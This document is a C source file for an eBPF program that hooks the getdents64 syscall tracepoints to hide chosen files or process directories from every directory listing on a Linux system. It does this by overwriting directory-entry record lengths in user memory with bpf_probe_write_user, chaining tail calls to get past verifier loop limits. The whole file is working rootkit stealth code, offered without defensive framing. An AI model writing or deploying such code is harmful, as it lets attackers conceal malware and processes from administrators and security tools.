#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_core_read.h>

#define logprefix "hide_pid: "
#define bpf_printk(fmt, ...)                            \
({                                                      \
        char ____fmt[] = logprefix fmt;                 \
        bpf_trace_printk(____fmt, sizeof(____fmt),      \
                         ##__VA_ARGS__);                \
})

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 12);
    __type(key, char[32]); // filename
    __type(value, int); // just for lookup
} files_to_hide SEC(".maps");


/*
    The following maps are not user facing, they are used to store the state of the eBPF program
*/

struct {
  __uint(type, BPF_MAP_TYPE_PROG_ARRAY);
  __uint(max_entries, 2);
  __type(key, __u32);
  __type(value, __u32); // Hold our BPF programs for the tailcalls
} map_prog_array SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, long unsigned int); // dirent ptr to handle
} dirent_maps SEC(".maps");

struct {
  __uint(type, BPF_MAP_TYPE_HASH);
  __uint(max_entries, 8192);
  __type(key, size_t);
  __type(value, long unsigned int);
} map_to_patch SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, int);
} dirent_offset SEC(".maps"); // We hold bpos values if we need todo tail calls

SEC("tp/syscalls/sys_enter_getdents64")
int hide_pid_enter(struct trace_event_raw_sys_enter *ctx)
{
    /* Format (/sys/kernel/debug/tracing/events/syscalls/sys_enter_getdents64/format)
                    field:unsigned short common_type;	offset:0;	size:2;	signed:0;
                    field:unsigned char common_flags;	offset:2;	size:1;	signed:0;
                    field:unsigned char common_preempt_count;	offset:3;	size:1;	signed:0;
                    field:int common_pid;	offset:4;	size:4;	signed:1;

                    field:int __syscall_nr;	offset:8;	size:4;	signed:1;
    ctx->args[0]    field:unsigned int fd;	offset:16;	size:8;	signed:0;
    ctx->args[1]    field:struct linux_dirent64 * dirent;	offset:24;	size:8;	signed:0;
    ctx->args[2]    field:unsigned int count;	offset:32;	size:8;	signed:0;
    */
    size_t pid_tgid = bpf_get_current_pid_tgid();
    struct linux_dirent64 *dirp = (struct linux_dirent64 *)ctx->args[1];
    bpf_map_update_elem(&dirent_maps, &pid_tgid, &dirp, 0); // BPF_ANY
    /*
    We are storing the pointer to the dirent struct in a map, so that we can access it later in the exit syscall.

    Why ?

    That pointer will contain the list of files in the directory but for now it's empty, so we can't do anything with it as the list is not yet populated.
    But for now it's only to determine which getsdent64 call to filter on (All by default)
    */
    return 0;
}

SEC("tp/syscalls/sys_exit_getdents64")
int hide_pid_exit(struct trace_event_raw_sys_exit *ctx)
{
    int total_bytes_read = ctx->ret;
    if (total_bytes_read <= 0)
        return 0;

    size_t pid_tgid = bpf_get_current_pid_tgid();
    long unsigned int *pbuff_addr = bpf_map_lookup_elem(&dirent_maps, &pid_tgid);
    if (pbuff_addr == NULL)
        return 0;
    long unsigned int buff_addr = *pbuff_addr;
    unsigned int bpos = 0;
    unsigned int *bpos_ptr = bpf_map_lookup_elem(&dirent_offset, &pid_tgid);
    if (bpos_ptr != NULL) {
        bpos = *bpos_ptr;
    }
    // We are going to loop through until we find the name of folder we want to hide
    // As we are also limited by the eBPF verifier, we have a maximum loop allowed so to bypass that we are going to use tail calls

    // We are going to use the bpf_probe_read_str function to read the name of the folder
    struct linux_dirent64 *dirp = 0;
    struct linux_dirent64 *dirp_previous = 0;
    char filename[32]; // I don't think we are going to have a filename longer than 32 characters to hide
    for (int e = 0; e < 32; e++) {
        filename[e] = 0x00;
    }
    short unsigned int d_reclen = 0;

    for (int i = 0; i < 200; i++)
    {
        if (bpos >= total_bytes_read)
            break;
        dirp = (struct linux_dirent64 *)((void *)buff_addr + bpos);
        bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);
        bpf_probe_read_str(&filename, 32, dirp->d_name);
        int first_null = 0;
        for (int e = 0; e < 32; e++) {  // Patching https://lore.kernel.org/all/cover.1604620776.git.dxu@dxuuu.xyz/T/ as my kernel does break some things
            if (filename[e] == 0x00) {
                first_null = 1;
            }
            if (first_null == 1) {
                filename[e] = 0x00;
            }
        }
        int *found = bpf_map_lookup_elem(&files_to_hide, &filename);
        if (found != 0) { // We found a file to hide
            // Tailcall to the function that will hide the file
            bpf_map_update_elem(&map_to_patch, &pid_tgid, &dirp_previous, 0); // Saving our dirent ptr to patch
            bpf_tail_call(ctx, &map_prog_array, 1);
        }
        
        dirp_previous = dirp;
        bpos += d_reclen;
    }

    if (bpos < total_bytes_read) {
        bpf_map_update_elem(&dirent_offset, &pid_tgid, &bpos, 0); // Saving our offset for the tailcall
        bpf_tail_call(ctx, &map_prog_array, 0); // Tailcall to the function that will continue the loop
    }

    bpf_map_delete_elem(&dirent_offset, &pid_tgid);
    bpf_map_delete_elem(&dirent_maps, &pid_tgid);
    return 0;
}

SEC("tp/syscalls/sys_exit_getdents64")
int hide_pid_make_it_disappear(struct trace_event_raw_sys_exit *ctx)
{
    unsigned int bpos = 0;
    size_t pid_tgid = bpf_get_current_pid_tgid(); // if im coming from a tailcall, i should have the pid_tgid in the map
    long unsigned int *pbuff_addr = bpf_map_lookup_elem(&map_to_patch, &pid_tgid);
    if (pbuff_addr == 0) {
        return 0;
    }
    unsigned int *bpos_ptr = bpf_map_lookup_elem(&dirent_offset, &pid_tgid);
    if (bpos_ptr != NULL) {
        bpos = *bpos_ptr;
    }


    long unsigned int buff_addr = *pbuff_addr;
    struct linux_dirent64 *dirp_previous = (struct linux_dirent64 *)buff_addr;
    short unsigned int d_reclen_previous = 0;
    bpf_probe_read_user(&d_reclen_previous, sizeof(d_reclen_previous), &dirp_previous->d_reclen);

    struct linux_dirent64 *dirp = (struct linux_dirent64 *)(buff_addr+d_reclen_previous);
    short unsigned int d_reclen = 0;
    bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);

    // Let's hop over the current dirent
    short unsigned int d_reclen_new = d_reclen_previous + d_reclen; // we are skipping the current dirent
    bpf_probe_write_user(&dirp_previous->d_reclen, &d_reclen_new, sizeof(d_reclen_new));
    bpos += d_reclen;

    // We finished processing it, let's go back to the loop in case there's more to hide
    bpf_map_delete_elem(&map_to_patch, &pid_tgid);
    bpf_tail_call(ctx, &map_prog_array, 0);
    return 0;
}

char LICENSE[] SEC("license") = "GPL";
